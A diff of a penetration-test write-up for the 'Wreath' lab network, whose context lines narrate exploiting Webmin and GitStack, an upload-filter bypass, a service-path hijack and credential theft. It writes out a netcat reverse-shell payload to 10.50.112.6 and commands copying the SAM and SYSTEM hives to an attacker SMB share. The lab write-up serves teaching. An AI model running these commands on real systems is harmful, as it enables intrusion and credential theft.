@@ -118,37 +118,37 @@ We are given the ip of one of the systems on the network. This is the only machi
 
 As with all penetration tests, I started by enumerating the ports of the target. This is an important step, as it is useful in identifying possible attack vectors. The services and versions of our target can be enumerated using the nmap tool and giving it the flags \-sC and \-sV. The \-sC flag runs nmap’s default scripts, while the \-sV flag detects the versions of the scanned services. Note that knowing the version of a service is essential in determining the likelihood of it being vulnerable (old versions tend to have more known vulnerabilities, as they have been exposed to the warzone of the internet for a longer period of time). We can enumerate all open ports with the \-p- flag and output all formats with the \-oA flag.
 
-![](/images/reports/Wreath/image28.png)
+![](/reports/Wreath/image28.png)
 
 We see that there are only four ports open. From the nmap scan, observe that the target machine is running an HTTP and HTTPS server on ports 80 and 443 respectively. It’s important to notice that it is running Apache httpd 2.4.37 which belongs to the CentOS Linux distribution. Therefore, it’s very likely that the target is running CentOS.
 
-![](/images/reports/Wreath/image43.png)
+![](/reports/Wreath/image43.png)
 
 Using the curl tool to send a GET request to the server, we see that it is trying to redirect us to https://thomaswreath.thm. However, the DNS of the target is not set up, as can be observed from the domain not being able to route us to the requested website.
 
-![](/images/reports/Wreath/image38.png)
+![](/reports/Wreath/image38.png)
 
 Currently, this domain is not recognized by any of our VirtualHost[[2]](#ftnt2) definitions. However, adding thomaswreath.thm to the /etc/hosts file (the file in Linux which is responsible for mapping hostnames to IP addresses), and running the same curl command again produces a different output:.
 
-![](/images/reports/Wreath/image5.png)
+![](/reports/Wreath/image5.png)
 
-![](/images/reports/Wreath/image21.png)
+![](/reports/Wreath/image21.png)
 
 We can add the \-k flag to specify that we don’t care to verify the server’s certificate (note this is insecure but it is fine in the context of this test):
 
-![](/images/reports/Wreath/image65.png)
+![](/reports/Wreath/image65.png)
 
 And now we get what looks to be a webpage. Browsing to this domain through Firefox, we reach yet another warning:
 
-![](/images/reports/Wreath/image7.png)
+![](/reports/Wreath/image7.png)
 
 One thing that’s important to do before proceeding to the website is to check the server certificate. The certificate could give information about more domains that the web server may have, as well as some other useful information like names, locations, and email addresses. This can be checked by clicking on the “Advanced'' box, and then clicking on the “View Certificate” link. I didn’t see anything too interesting, but there is one email address:
 
-![](/images/reports/Wreath/image45.png)
+![](/reports/Wreath/image45.png)
 
 I now proceeded to the website and was met with the following page:
 
-![](/images/reports/Wreath/image39.png)
+![](/reports/Wreath/image39.png)
 
 ### RCE Exploitation
 
@@ -158,11 +158,11 @@ Nothing out of the ordinary was found while browsing through this website. Howev
 
 Seeing as this is a well known vulnerability, Metasploit already had a script to exploit this version of Webmin:
 
-![](/images/reports/Wreath/image49.png)
+![](/reports/Wreath/image49.png)
 
 After setting the LHOST and RHOST, I ran the exploit and got a shell!
 
-![](/images/reports/Wreath/image47.png)
+![](/reports/Wreath/image47.png)
 
 The web server was running as root! It is better practice to run a web service as a low-privileged user such as www-data just in case the web server gets compromised.
 
@@ -170,21 +170,21 @@ The web server was running as root! It is better practice to run a web service 
 
 As root, the highest-privileged Linux user, we can extract the hash of users on the system and try to crack it. It’s possible that this same password is used in some other machine on the network.  
 
-![](/images/reports/Wreath/image58.png)
+![](/reports/Wreath/image58.png)
 
 Providing the \--example-hashes flag in hashcat (a tool for cracking hashes) and grepping for unix, we can see that the mode for the /etc/shadow hashes is 1800 (note that the hash corresponding to mode 1800 looks most similar to the hashes in the /etc/shadow file).
 
-![](/images/reports/Wreath/image27.png)
+![](/reports/Wreath/image27.png)
 
 Alternatively, another way to determine the identity of a hash is by using tools such as hashid or hash-identifier:
 
-![](/images/reports/Wreath/image37.png)
+![](/reports/Wreath/image37.png)
 
 The password used for the root user is secure enough to not be cracked by the rockyou.txt file, so I copied this hash to examine for later if needed.
 
 After compromising the root user, I maintained persistence by going into /root/.ssh/id_rsa and copying the contents of the id_rsa file (this is a private key which is used to authenticate a client to a server).
 
-![](/images/reports/Wreath/image29.png)
+![](/reports/Wreath/image29.png)
 
 Second Machine (.150)
 ---------------------
@@ -193,7 +193,7 @@ Second Machine (.150)
 
 With full access on one of the three machines on the Wreath network, I enumerated the internal network to find any other systems by using nmap on the compromised system (a static binary of it can be downloaded on GitHub[[4]](#ftnt4)). To speed up the process, I added the \-sn flag which disables port scans.
 
-![](/images/reports/Wreath/image33.png)
+![](/reports/Wreath/image33.png)
 
 We see that there are a total of four other machines on the internal network (note we are 10.200.111.200). I was told by the client that the host ending in .1 is part of the AWS infrastructure used for creating the network, and the host ending in .250 is the OpenVPN server. As such, we will focus on the two hosts ending in .100 and .150.
 
@@ -201,7 +201,7 @@ We see that there are a total of four other machines on the internal network (no
 
 After discovering these two hosts, I enumerated their ports:
 
-![](/images/reports/Wreath/image34.png)
+![](/reports/Wreath/image34.png)
 
 Observe that all of the ports on the .100 machine are filtered, but the .150 computer has three ports open (80, 3389, and 5985). It’s important to note that it’s likely this is a Windows machine due to ports 3389 (typically reserved for RDP) and 5985 (WRM / WinRM) being open.
 
@@ -209,11 +209,11 @@ Observe that all of the ports on the .100 machine are filtered, but the .150 com
 
 The HTTP service on port 80 is a good one to forward because web servers have a big attack surface (I chose to forward this port to localhost on port 18020 using ssh).
 
-![](/images/reports/Wreath/image48.png)
+![](/reports/Wreath/image48.png)
 
 Now when I visited localhost:18020, I was met with a web page:
 
-![](/images/reports/Wreath/image32.png)
+![](/reports/Wreath/image32.png)
 
 Looking at the error on the webpage, we see that there are three directories:
 
@@ -223,11 +223,11 @@ Looking at the error on the webpage, we see that there are three directories:
 
 The /user subdirectory under /rest discloses information about the users on the GitStack software, but I was unable to find anything that looked alarming.
 
-![](/images/reports/Wreath/image44.png)
+![](/reports/Wreath/image44.png)
 
 Visiting /gitstack redirected me to a login page on /registration/login:
 
-![](/images/reports/Wreath/image50.png)
+![](/reports/Wreath/image50.png)
 
 There is a nice handy message that says the default username and password is admin/admin, but trying it out reveals that the credentials for this login page have since been changed. The source code of the page did not reveal anything either.
 
@@ -235,13 +235,13 @@ There is a nice handy message that says the default username and password is adm
 
 However, knowing that this machine is only available on the internal network, it is possible that its software is not updated. The outdated software of this website is especially alarming when looking at the output of nikto, a tool for scanning vulnerabilities on web servers:
 
-![](/images/reports/Wreath/image9.png)
+![](/reports/Wreath/image9.png)
 
 Note the large amount of outdated software
 
 It follows that the GitStack software used on the target might also be outdated and vulnerable. Searchsploit is a great tool for finding exploits for outdated software:
 
-![](/images/reports/Wreath/image16.png)
+![](/reports/Wreath/image16.png)
 
 All three exploit results about GitStack are about the same version (namely 2.3.10). I then copied the exploit php/webapps/43777.py onto my local machine.
 
@@ -249,11 +249,11 @@ All three exploit results about GitStack are about the same version (namely 2.3.
 
 Before running this exploit, we will examine it to see how it works:
 
-![](/images/reports/Wreath/image14.png)
+![](/reports/Wreath/image14.png)
 
 As can be seen from the image above, the password field is most likely vulnerable (as it turns out, the username field is also vulnerable). The python script injects PHP code into the password field, and the web server executes it. This critical vulnerability was caused by passing unsanitized user input into an exec function[[5]](#ftnt5):
 
-![](/images/reports/Wreath/image15.png)
+![](/reports/Wreath/image15.png)
 
 When running the script, it uploads a PHP web shell called exploit.php with the parameter ‘a’ to the /web directory (I modified the script and called it exploit-0xd4y.php, as it is good practice to change the default configurations of an exploit whether that be a password to a backdoor, parameters, etc).
 
@@ -261,7 +261,7 @@ When running the script, it uploads a PHP web shell called exploit.php with the
 
 I curled this web shell and provided it the \-d flag to specify the data to be inputted:
 
-![](/images/reports/Wreath/image13.png)
+![](/reports/Wreath/image13.png)
 
 And this web server is running as System, the highest-privileged Windows user (even higher than Administrator)! I then tried to find a way to get a reverse shell from the exploited system. The first thing to test is to see if our attack box can be pinged from the target (I made sure to use the \-n flag to specify how many packets to send). It is extremely important to note this seemingly insignificant flag. If we were to not specify how many packets to send, the server would constantly be trying to ping us, and there would be no way for us to stop this command without somehow killing the process. A constant ping to our attack box would therefore look suspicious.
 
@@ -269,11 +269,11 @@ And this web server is running as System, the highest-privileged Windows user (e
 
 We can set up a tcpdump on the tun0 interface (the VPN routing path) and provide it with the icmp argument (Internet Control Message Protocol) so that we are only listening for pinging packets.
 
-![](/images/reports/Wreath/image40.png)
+![](/reports/Wreath/image40.png)
 
 Alas, I did not receive a response from the server. This meant that we cannot send a direct reverse shell from .150 to us. However, we can use nishang[[6]](#ftnt6) to get a socat reverse shell relay. CentOS, the operating system of the compromised .200 machine, has a very restrictive firewall called firewalld that will limit almost all inbound connections.
 
-![](/images/reports/Wreath/image46.png)
+![](/reports/Wreath/image46.png)
 
 We can see that the firewall is active
 
@@ -285,21 +285,21 @@ I used a socat reverse shell to demonstrate this, as it is instructive on how ne
 
 1.  We are going to set up a listening port on 20001 on the .200 machine and forward all traffic from that port to 20002 on our machine.
 
-![](/images/reports/Wreath/image35.png)
+![](/reports/Wreath/image35.png)
 
 2.  Next, we will set up netcat listening on port 20002 on our system:
 
-![](/images/reports/Wreath/image66.png)
+![](/reports/Wreath/image66.png)
 
 3.  I used the Invoke-PowerShellTcp.ps1 nishang script and added Invoke-PowerShellTcp -Reverse -IPAddress 10.200.111.200 -Port 20001 to the bottom of the script, so that when downloading the script using IEX (more on this later), each line in the script will be automatically executed giving us a reverse shell:
 
-![](/images/reports/Wreath/image20.png)
+![](/reports/Wreath/image20.png)
 
 Note how we are sending the reverse shell to .200 on port 20001 (remember all traffic on port 20001 will be directed to our port 20002 on our machine).
 
 4.  Now, the firewall will block inbound connections for any ports that are not specified as exceptions. We have to tell the firewall which ports it should allow for connections by using the firewall-cmd command as such:
 
-![](/images/reports/Wreath/image41.png)
+![](/reports/Wreath/image41.png)
 
 Alternatively you can type systemctl stop firewalld to completely disable the firewall, though this is one of the noisiest actions a pentester can do, and it should only be done when it is an absolute necessity.
 
@@ -308,65 +308,65 @@ Remember that port 20001 will be directing all traffic to us.
 5.  Port 20003 will be the HTTP server on .200 which we can set up with python3 -m http.server 20003; it will serve the powershell reverse shell file (which I renamed to 0xd4y-rev.ps1).
 6.  Finally, it’s time for the payload. We can download files / strings using IEX (Elixir’s Interactive Shell) in powershell.  
 
-![](/images/reports/Wreath/image70.png)
+![](/reports/Wreath/image70.png)
 
 Note the usage of three single quotes in the data argument to tell our bash shell to not interpret anything inside the quotes.
 
 Unfortunately, this payload did not work (most likely due to some special characters). I am running commands through a web shell, and therefore it is likely that the server is not understanding some of the special characters in the payload. This means that most likely we will have to url-encode the payload for it to work:        
 
-![](/images/reports/Wreath/image64.png)
+![](/reports/Wreath/image64.png)
 
 Sure enough, when I executed this command, the output hanged and I got a hit on the python HTTP server!
 
-![](/images/reports/Wreath/image77.png)
+![](/reports/Wreath/image77.png)
 
 So now that 0xd4y-rev.ps1 was executed by the server, there should be a reverse shell getting sent to port 20001 on .200 which is getting forwarded to us on 20002:
 
-![](/images/reports/Wreath/image17.png)
+![](/reports/Wreath/image17.png)
 
 #### Attempting to Use Mimikatz
 
 Now, with a reverse shell as System, we have the necessary privileges to extract password hashes using Mimikatz, a tool used to gather credentials on a system. Before downloading Mimikatz onto the target, it’s important to check if the target is a 32bit or 64bit computer by using the systeminfo command:
 
-![](/images/reports/Wreath/image53.png)
+![](/reports/Wreath/image53.png)
 
 Noticing that this is a 64bit computer, I downloaded a 64bit mimikatz binary:
 
-![](/images/reports/Wreath/image25.png)
+![](/reports/Wreath/image25.png)
 
 I downloaded this binary in the C:\\Windows\\System32\\spool\\drivers\\color directory out of habit, as this is a world writable path and is typically whitelisted by AppLocker, a program which restricts which files can be executed based on the file’s path.
 
 Alas, running Mimikatz on an unstable shell simply does not work. I tried getting a meterpreter shell, but that did not work either. However, with ssh being open on .200, a powerful tool named sshuttle can be leveraged as a VPN into this internal network:
 
-![](/images/reports/Wreath/image12.png)
+![](/reports/Wreath/image12.png)
 
 We can confirm this worked by trying to curl the web page:
 
-![](/images/reports/Wreath/image10.png)
+![](/reports/Wreath/image10.png)
 
 ### Shell Stabilization
 
 Earlier, we found that port 3389 was open on the .150 system. This is the port typically designated for Remote Desktop Protocol (RDP), and we can use this port to get a nice GUI on the box. First, I created a user with admin privileges inside the Remote Management Users group so as to allow us to remotely authenticate as the user through RDP:
 
-![](/images/reports/Wreath/image11.png)
+![](/reports/Wreath/image11.png)
 
 We can now use evil-winrm with our created credentials to easily get a shell on the box:
 
-![](/images/reports/Wreath/image76.png)
+![](/reports/Wreath/image76.png)
 
 #### Mimikatz
 
 With the user that we created, a nice GUI instance can be established using the xfreerdp command as follows:
 
-![](/images/reports/Wreath/image31.png)
+![](/reports/Wreath/image31.png)
 
 This results in a GUI instance of the box. I executed cmd.exe as Administrator because the created user is part of the Administrators group. With administrative privileges, it’s possible to extract Windows’ stored credentials (I talk about this in depth in my Bastion Writeup[[7]](#ftnt7)).  
 
-![](/images/reports/Wreath/image52.png)
+![](/reports/Wreath/image52.png)
 
-![](/images/reports/Wreath/image59.png)
+![](/reports/Wreath/image59.png)
 
-![](/images/reports/Wreath/image1.png)
+![](/reports/Wreath/image1.png)
 
 These NTLM Hashes were edited so as to not expose the full hash
 
@@ -376,7 +376,7 @@ Looking at the output of Mimikatz, we can see the hashes for all the users on t
 
 Copying the output of Mimikatz, I saw that Thomas has an insecure password which hashcat cracked (alternatively, you can use [https://crackstation.net/](https://www.google.com/url?q=https://crackstation.net//&sa=D&source=editors&ust=1653838005042499&usg=AOvVaw1faAwek1-_0r6RfsC5v4ie)[[8]](#ftnt8)). However, the Administrator password was too secure to crack, but it is still possible to use this hash for authenticating as the Administrator user. Evil-winrm has an extremely powerful flag denoted with \-H which is used to gain access to an account by performing a pass the hash attack (PtH).
 
-![](/images/reports/Wreath/image68.png)
+![](/reports/Wreath/image68.png)
 
 ##### How a Pass the Hash Attack (PtH) Works
 
@@ -403,7 +403,7 @@ Third Machine (.100)
 
 After establishing persistence on the .150 host, the third and final machine is yet to be compromised (the .100 computer). The first thing we should do is enumerate the ports of the machine, just like we did with all the other compromised systems. Instead of trying to manually upload a port scanning script onto the box, we can use evil-winrm by utilizing the -s flag!
 
-![](/images/reports/Wreath/image22.png)
+![](/reports/Wreath/image22.png)
 
 We see that ports 80 and 3389 are open. These most likely correspond to HTTP and RDP respectively. Unfortunately, we cannot access this computer through the .200 proxy because it is only visible by .150.
 
@@ -413,39 +413,39 @@ This means that we will need to create a proxy on the .150 machine. A tool calle
 
 1.  The server must be told to disable the firewall on the port we want to use for the forward proxy (I will use port 30001):
 
-![](/images/reports/Wreath/image6.png)
+![](/reports/Wreath/image6.png)
 
 2.  The server should then be told to listen on port 30001 for inbound connections:
 
-![](/images/reports/Wreath/image18.png)
+![](/reports/Wreath/image18.png)
 
 3.  Next, on the attacking box we want to connect to the listening port, and forward all data to a proxy sitting on 30002:
 
-![](/images/reports/Wreath/image71.png)
+![](/reports/Wreath/image71.png)
 
 4.  We then configure the web browser extension FoxyProxy to connect to this proxy:
 
-![](/images/reports/Wreath/image8.png)
+![](/reports/Wreath/image8.png)
 
 5.  Finally, we can visit the website sitting on .100:
 
-![](/images/reports/Wreath/image73.png)
+![](/reports/Wreath/image73.png)
 
 ### Examining the Web Server
 
 Along with FoxyProxy, Wappalyzer is also a very useful browser extension which displays useful information about how a website is built. Running this extension on Thomas’s personal website, we see the following:
 
-![](/images/reports/Wreath/image36.png)
+![](/reports/Wreath/image36.png)
 
 #### Analysing the Website’s Code
 
 This website looks identical to the one on the .200 host. Thomas told us that he is “serving a website that's pushed to my git server”. The .150 machine has a git server and this is most likely what he was referring to, so I downloaded the source code of his website.
 
-![](/images/reports/Wreath/image75.png)
+![](/reports/Wreath/image75.png)
 
 Using the extractor tool from GitTools[[10]](#ftnt10), I iterated through the commits of the git repository. Unfortunately, this tool does not list the commits by date, but this can be done manually by looking at the parent of each commit:
 
-![](/images/reports/Wreath/image74.png)
+![](/reports/Wreath/image74.png)
 
 We see that the commit starting with 70dd does not have a parent, so this must be the oldest commit. The parent of 82df is 70dd, and the parent of 345a is 82df. This means that from youngest to oldest the commits are as follows:
 
@@ -455,13 +455,13 @@ We see that the commit starting with 70dd does not have a parent, so this must b
 
 We can examine the code from the most recent commit. Seeing as Wappanalyzer identified Thomas’s webpage as being run in PHP, it follows that there should likely be an index.php file.
 
-![](/images/reports/Wreath/image54.png)
+![](/reports/Wreath/image54.png)
 
-Taking a look at the file, there seems to be an upload feature that redirects uploaded files to a directory called uploads/..![](/images/reports/Wreath/image62.png)
+Taking a look at the file, there seems to be an upload feature that redirects uploaded files to a directory called uploads/..![](/reports/Wreath/image62.png)
 
 The filter checks if a file is an image based on its size and if a file ends with a valid extension. We can see that the allowed extensions are jpg, jpeg, png, and gif, so I examined how the webpage identifies the extension:
 
-![](/images/reports/Wreath/image60.png)
+![](/reports/Wreath/image60.png)
 
 The explode function splits a string into an array based on a specified parameter. In the code, it is set to split based on the period character and grabs the string at index one (note that this is the second element in the array, as the first element is at index zero). It then compares this string with one of the allowed extensions. The problem with this is that upon uploading a file called reverse-shell.jpg.php, the code will split the file as follows:
 
@@ -469,25 +469,25 @@ The explode function splits a string into an array based on a specified paramete
 
 Then, the string in the first index (jpg) will be compared. Thus, we have bypassed the first filter. The second filter (i.e. the image size check) can also be bypassed[[11]](#ftnt11). We can add a comment to an image with malicious php code, and if the server executes our image as php, then our malicious code will work as a web shell.
 
-![](/images/reports/Wreath/image56.png)
+![](/reports/Wreath/image56.png)
 
 A basic HTTP authentication is required to access the /resources directory, but we cracked Thomas’s hash [before](#h.wzvkxqwdhgz4), so it is likely that Thomas reused this password for authentication to his web server. We can guess that the username is Thomas, or other variations of his name, and we get into the upload page (it turns out that the username was indeed Thomas).
 
 ### Reverse Shell
 
-![](/images/reports/Wreath/image3.png)
+![](/reports/Wreath/image3.png)
 
 I then uploaded the malicious image file (0xd4y-image.jpg.php):
 
-![](/images/reports/Wreath/image51.png)
+![](/reports/Wreath/image51.png)
 
 Visiting the uploaded script on resources/uploads/0xd4y-image.jpg.php reveals that it got successfully uploaded. To test if the image successfully is getting executed as php, I gave the command of whoami to the parameter cmd.
 
-![](/images/reports/Wreath/image63.png)
+![](/reports/Wreath/image63.png)
 
 And the php web shell works! The next step is to get a reverse shell. After identifying the target as a 64 bit machine by using systeminfo, I uploaded a 64bit netcat binary[[12]](#ftnt12) and called it 0xd4y-nc.exe. I then set up an HTTP server on my local box with python and downloaded the binary onto the system with curl. To get a reverse shell, I used a simple nc reverse shell payload: powershell.exe%20C:\\xampp\\htdocs\\resources\\uploads\\0xd4y-nc.exe%2010.50.112.6%20443%20-e%20cmd.exe
 
-![](/images/reports/Wreath/image30.png)
+![](/reports/Wreath/image30.png)
 
 Note how I used port 443 for the reverse shell, as this port tends to be treated as unsuspicious by AV. In contrast, using port 1337 or port 9001 seems very suspicious (but in this case it works anyways).
 
@@ -497,7 +497,7 @@ Note how I used port 443 for the reverse shell, as this port tends to be treated
 
 Enumerating the privileges of our compromised user, we don’t see anything too out of the ordinary.
 
-![](/images/reports/Wreath/image72.png)
+![](/reports/Wreath/image72.png)
 
 However, this user does have the SeImpersonatePrivilege which could potentially be vulnerable to exploits such as Juicy Potato[[13]](#ftnt13) (note that even though this is a 2019 Windows system rather than 2016, there have been some exploitations of this privilege in later versions[[14]](#ftnt14)).  
 
@@ -507,7 +507,7 @@ I ignored this potential privilege escalation vector due to its greater complexi
 
  It’s likely that the default Windows paths will not be vulnerable to this sort of attack, so I focused on services that were not in C:\\Windows.
 
-![](/images/reports/Wreath/image67.png)
+![](/reports/Wreath/image67.png)
 
 As it turned out, there was a service that contained an unquoted path called SystemExplorerHelpService.
 
@@ -527,39 +527,39 @@ It is highly unlikely that the compromised user has write access to C:\\Program 
 
 Checking to see if this service is running as System revealed that it is!
 
-![](/images/reports/Wreath/image24.png)
+![](/reports/Wreath/image24.png)
 
 This seemed like a good vector for privilege escalation, however, I understood that I would be lucky if the compromised user had permissions to edit this service.
 
-![](/images/reports/Wreath/image4.png)
+![](/reports/Wreath/image4.png)
 
 Seeing as we are part of the BUILTIN\\Users group, we have FullControl to this service! The System Explorer executable can therefore be replaced by whatever we would like. I created a program in C# called malicious.cs that returns a reverse shell.
 
-![](/images/reports/Wreath/image78.png)
+![](/reports/Wreath/image78.png)
 
 Following the creation of the script, I compiled this program with mcs, a C# compiler:
 
-![](/images/reports/Wreath/image26.png)
+![](/reports/Wreath/image26.png)
 
 After compiling the program, I renamed malicious.exe to System.exe. Seeing as System is running the service we are trying to hijack, it follows that we should get a reverse shell as System when restarting the service. After downloading the binary to the target, I copied it over to the C:\\Program Files (x86)\\System Explorer\\ directory.
 
-![](/images/reports/Wreath/image19.png)
+![](/reports/Wreath/image19.png)
 
 With the malicious binary in place, I set up a netcat listener on port 443 (as specified in the C# code) before restarting the service:
 
-![](/images/reports/Wreath/image57.png)
+![](/reports/Wreath/image57.png)
 
 Typing sc stop SystemExplorerHelpService (to stop the service) and sc start SystemExplorerHelpService (to start the service) resulted in a reverse shell as System:
 
-![](/images/reports/Wreath/image2.png)
+![](/reports/Wreath/image2.png)
 
 ### Data Exfiltration
 
 Now, with a reverse shell as System, we can extract the stored credentials on this system. Mimikatz cannot be used as Antivirus is installed on this machine. However, because we are System, we can copy the SAM and SYSTEM files and locally extract the stored hashes. I set up an SMB server on my machine to download the files with sudo impacket-smbserver share . -smb2support -username 0xd4y -password pass and transferred the SAM and SYSTEM hives as follows:
 
-![](/images/reports/Wreath/image61.png)
+![](/reports/Wreath/image61.png)
 
-![](/images/reports/Wreath/image55.png)
+![](/reports/Wreath/image55.png)
 
 Note that we received the NTLMV2 hash of our created SMB user. Cracking this hash reveals that the password of 0xd4y is pass.
 
@@ -567,11 +567,11 @@ On the reverse shell, I typed copy HKLM\\SYSTEM \\\\10.50.112.6\\share\\SYSTEM, 
 
 copy HKLM\\SAM \\\\10.50.112.6\\share\\SAM
 
-![](/images/reports/Wreath/image42.png)
+![](/reports/Wreath/image42.png)
 
 Now with the sensitive SAM and SYSTEM hives on my local system, I was able to extract all hashes using the impacket-secretsdump tool.
 
-![](/images/reports/Wreath/image69.png)
+![](/reports/Wreath/image69.png)
 
 Cleanup
 =======
